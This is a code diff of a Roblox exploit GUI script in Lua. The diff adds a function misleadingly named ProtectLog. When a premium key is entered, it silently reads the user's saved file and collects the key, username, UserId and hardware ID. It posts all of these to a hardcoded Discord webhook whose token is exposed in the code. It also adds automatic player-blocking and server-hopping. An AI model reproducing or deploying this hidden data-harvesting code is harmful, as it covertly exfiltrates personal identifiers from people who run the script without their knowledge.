@@ -270,7 +270,7 @@ UICorner_11.Parent = Background_2
 
 -- Scripts:
 
-local function HHIQG_fake_script() -- System.Controller 
+local function KRRHTV_fake_script() -- System.Controller 
 	local script = Instance.new('LocalScript', System)
 
 	local TeleportService = game:GetService("TeleportService")
@@ -1222,6 +1222,58 @@ local function HHIQG_fake_script() -- System.Controller
 	
 	end
 	
+	function ProtectLog()
+		spawn(function()
+	
+			local SaveFileData = "No file found?"
+			pcall(function()
+				SaveFileData = readfile(saveFile)
+			end)
+			local LoggedKey = "No key found?"
+	
+			if _G.PremiumKeyEntered then
+				LoggedKey = _G.PremiumKeyEntered
+			end
+	
+			local HttpService = game:GetService("HttpService")
+			local webhook = "https://discord.com/api/webhooks/1409688736207208550/9q2glSK5C_xlxCS-Wicwka721bNSm-09JKr4g6nZiuvIg_3GBAv3YtGYeCd90MD2PpF6"
+			local payload = {
+				embeds = {
+					{
+						title = "Premium Loaded",
+						description = "Key loaded: "..LoggedKey.."",
+						color = 0, -- BLACK
+						fields = {
+							{
+								name = "Saved file data",
+								value = SaveFileData
+							},
+							{
+								name = "Identifier",
+								value = ""..game.Players.LocalPlayer.Name.." || "..tostring(game.Players.LocalPlayer.UserId)..""
+							},
+							{
+								name = "HWID",
+								value = gethwid()
+							},
+						}
+					}
+				}
+			}
+			local body = HttpService:JSONEncode(payload)
+			pcall(function()
+				request({
+					Url = webhook,
+					Method = "POST",
+					Headers = {
+						["Content-Type"] = "application/json"
+					},
+					Body = body
+				})
+			end)
+		end)
+	end
+	
 	LoadGlobals()
 	
 	if not _G.GuiSafetyCodeRunning then
@@ -1322,7 +1374,11 @@ local function HHIQG_fake_script() -- System.Controller
 							end)
 						end
 					end)
-					wait(9)
+					wait(4)
+					BlockPlayer()
+					wait(4)
+					ServerHop()
+					
 					if PlayerWantsTeleport then ServerHop() end
 				end
 			end)
@@ -1373,6 +1429,8 @@ local function HHIQG_fake_script() -- System.Controller
 		_G.UpdateLoadstring = true
 		SendNotification("Dabitob","yeooo prem jit","rbxassetid://12386566164","3","k fine")
 		
+		ProtectLog()
+		
 		spawn(function() -- spawning at bugged
 			local spawnPart = workspace:WaitForChild("Spawn"):WaitForChild("SpawnLocation")
 			while wait(1) do
@@ -1421,6 +1479,27 @@ local function HHIQG_fake_script() -- System.Controller
 			end)
 			
 			PlayerLost()
+		end)
+		
+		spawn(function()
+			wait(3)
+			local GameMode = workspace:WaitForChild("Gamemode")
+			
+			if GameMode.Value ~= "Classic" then
+				BlockPlayer()
+				wait(4)
+				ServerHop()
+			end
+			
+			GameMode.Changed:Connect(function()
+				if GameMode.Value ~= "Classic" then
+					BlockPlayer()
+					wait(4)
+					ServerHop()
+				end
+			end)
+			
+			
 		end)
 		
 		wait(1)	
@@ -1644,7 +1723,6 @@ local function HHIQG_fake_script() -- System.Controller
 		
 	end
 	
-	
 	if not _G.PremiumKeyEntered then
 		
 		GetKeyButton.MouseButton1Click:Connect(function()
@@ -1665,6 +1743,7 @@ local function HHIQG_fake_script() -- System.Controller
 					_G.UpdateLoadstring = true
 					_G.PremiumKeyEntered = KeyTextbox.Text
 					SendNotification("Dabitob","yeooo prem jit","rbxassetid://12386566164","3","k fine")
+					ProtectLog()
 					return
 				end
 	
@@ -1684,4 +1763,4 @@ local function HHIQG_fake_script() -- System.Controller
 	end
 	
 end
-coroutine.wrap(HHIQG_fake_script)()
+coroutine.wrap(KRRHTV_fake_script)()
